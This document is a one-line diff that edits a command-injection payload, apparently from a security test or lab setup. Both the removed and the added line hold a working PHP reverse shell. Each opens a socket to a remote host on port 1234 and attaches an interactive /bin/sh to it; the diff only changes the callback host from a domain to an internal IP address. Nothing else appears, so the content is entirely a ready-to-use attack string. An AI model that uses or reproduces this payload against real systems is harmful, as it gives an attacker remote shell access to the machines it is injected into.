@@ -1,1 +1,1 @@
-;php -h;php -r '$sock=fsockopen("tty-2.firebird.sh",1234);exec("/bin/sh -i <&3 >&3 2>&3");';
+;php -h;php -r '$sock=fsockopen("172.20.0.3",1234);exec("/bin/sh -i <&3 >&3 2>&3");';
